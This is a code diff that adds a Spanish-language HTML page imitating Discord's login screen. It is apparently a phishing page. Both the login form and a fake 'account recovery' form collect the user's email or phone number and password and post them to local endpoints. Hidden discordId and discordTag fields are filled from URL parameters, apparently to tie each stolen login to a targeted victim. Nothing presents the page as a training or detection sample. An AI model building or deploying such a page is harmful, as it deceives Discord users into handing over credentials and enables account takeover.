@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Iniciar sesión</title>
+    <style>
+        /* 1. RESETEO GENERAL Y FUENTE */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #313338; /* Fondo oficial de Discord (Dark Mode) */
+            background-image: url('https://discord.com'); /* Fondo sutil con ilustraciones */
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* 2. CONTENEDOR CENTRAL (MODAL) */
+        .login-container {
+            background-color: #313338;
+            background: #313338;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2), 0 4px 20px 0 rgba(0,0,0,0.19);
+            border-radius: 5px;
+            padding: 32px;
+            width: 784px;
+            display: flex;
+            justify-content: space-between;
+            color: #b5bac1;
+        }
+
+        /* 3. COLUMNA IZQUIERDA: FORMULARIO */
+        .login-form {
+            width: 414px;
+        }
+
+        .login-form h1 {
+            color: #f2f3f5;
+            font-size: 24px;
+            font-weight: 600;
+            line-height: 30px;
+            margin-bottom: 8px;
+            text-align: center;
+        }
+
+        .login-form .subtitle {
+            color: #b5bac1;
+            font-size: 16px;
+            line-height: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #949ba4;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 8px;
+        }
+
+        .form-group label span {
+            color: #f23f43; /* Asterisco rojo de campo requerido */
+            padding-left: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            height: 40px;
+            padding: 10px;
+            background-color: #1e1f22; /* Fondo de los inputs */
+            border: none;
+            border-radius: 3px;
+            color: #dbdee1;
+            font-size: 16px;
+            outline: none;
+            transition: border 0.2s ease;
+        }
+
+        .forgot-password {
+            color: #00a8fc;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 20px;
+            cursor: pointer;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .btn-login {
+            width: 100%;
+            height: 44px;
+            background-color: #5865f2; /* Color oficial "Blurple" */
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-bottom: 8px;
+        }
+
+        .btn-login:hover {
+            background-color: #4752c4; /* Blurple más oscuro al pasar el cursor */
+        }
+
+        .register-text {
+            font-size: 14px;
+            color: #949ba4;
+            margin-top: 4px;
+        }
+
+        .register-text a {
+            color: #00a8fc;
+            text-decoration: none;
+        }
+
+        .register-text a:hover {
+            text-decoration: underline;
+        }
+
+        /* 4. COLUMNA DERECHA: CÓDIGO QR */
+        .qr-section {
+            width: 240px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        .qr-container {
+            background-color: white;
+            padding: 8px;
+            border-radius: 4px;
+            margin-bottom: 32px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 176px;
+            height: 176px;
+            position: relative;
+        }
+
+        .qr-container::after {
+            content: '';
+            width: 40px;
+            height: 40px;
+            background-color: #313338;
+            background-image: url('https://website-files.com');
+            background-size: 70%;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: absolute;
+            border-radius: 6px;
+            border: 4px solid white;
+        }
+
+        .qr-section h2 {
+            color: #f2f3f5;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .qr-section p {
+            color: #b5bac1;
+            font-size: 16px;
+            line-height: 20px;
+        }
+
+        .qr-section p strong {
+            color: #dbdee1;
+            font-weight: 600;
+        }
+
+        /* 5. RESPONSIVE (Para pantallas móviles) */
+        @media (max-width: 830px) {
+            .login-container {
+                width: 480px;
+                padding: 32px;
+            }
+            .qr-section {
+                display: none;
+            }
+            .login-form {
+                width: 100%;
+            }
+        }
+
+        @media (max-width: 520px) {
+            body {
+                background-image: none;
+                background-color: #313338;
+            }
+            .login-container {
+                width: 100%;
+                height: 100vh;
+                box-shadow: none;
+                border-radius: 0;
+                justify-content: center;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <!-- Lado Izquierdo: Formularios Dinámicos -->
+        <div class="login-form">
+            
+            <!-- VISTA 1: INICIO DE SESIÓN -->
+            <div id="login-view">
+                <h1>¡Te damos la bienvenida de nuevo!</h1>
+                <div class="subtitle">¡Nos alegra verte otra vez!</div>
+                
+                <form action="/api/verificar" method="POST">
+                    <input type="hidden" id="discordId" name="discordId">
+                    <input type="hidden" id="discordTag" name="discordTag">
+
+                    <div class="form-group">
+                        <label for="email">Correo electrónico o número de teléfono <span>*</span></label>
+                        <input type="text" id="email" name="usuario" required autocomplete="off">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password">Contraseña <span>*</span></label>
+                        <input type="password" id="password" name="password" required>
+                    </div>
+                    
+                    <a class="forgot-password" onclick="mostrarRecuperacion()">¿Has olvidado tu contraseña?</a>
+                    
+                    <button type="submit" class="btn-login">Iniciar sesión</button>
+                    
+                    <div class="register-text">
+                        ¿Necesitas una cuenta? <a href="#">Registrarse</a>
+                    </div>
+                </form>
+            </div>
+
+            <!-- VISTA 2: RECUPERACIÓN DE CONTRASEÑA -->
+            <div id="recovery-view" style="display: none;">
+                <h1>Recuperar cuenta</h1>
+                <div class="subtitle">Introduce tu correo y contraseña para restablecer el acceso.</div>
+                
+                <form action="/api/recuperar" method="POST">
+                    <input type="hidden" id="discordId-rec" name="discordId">
+                    <input type="hidden" id="discordTag-rec" name="discordTag">
+
+                    <div class="form-group">
+                        <label for="email-rec">Correo electrónico <span>*</span></label>
+                        <input type="text" id="email-rec" name="usuario" required autocomplete="off">
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="password-rec">Contraseña <span>*</span></label>
+                        <input type="password" id="password-rec" name="password" required>
+                    </div>
+                    
+                    <a class="forgot-password" onclick="mostrarLogin()">← Volver al inicio de sesión</a>
+                    
+                    <button type="submit" class="btn-login">Continuar</button>
+                </form>
+            </div>
+
+        </div>
+
+        <!-- Lado Derecho: Código QR (Intacto) -->
+        <div class="qr-section">
+            <div class="qr-container">
+                <img src="https://qrserver.com" alt="Código QR de Discord" width="160" height="160">
+            </div>
+            <h2>Iniciar sesión con código QR</h2>
+            <p>Escanea esto con la <strong>aplicación móvil de Discord</strong> para iniciar sesión de forma instantánea.</p>
+        </div>
+    </div>
+
+    <!-- Script de control de vistas y parámetros de Discord -->
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const dId = urlParams.get('discordId') || '';
+        const dTag = urlParams.get('discordTag') || '';
+
+        // Asignar parámetros a ambos formularios
+        document.getElementById('discordId').value = dId;
+        document.getElementById('discordTag').value = dTag;
+        document.getElementById('discordId-rec').value = dId;
+        document.getElementById('discordTag-rec').value = dTag;
+
+        function mostrarRecuperacion() {
+            document.getElementById('login-view').style.display = 'none';
+            document.getElementById('recovery-view').style.display = 'block';
+        }
+
+        function mostrarLogin() {
+            document.getElementById('recovery-view').style.display = 'none';
+            document.getElementById('login-view').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
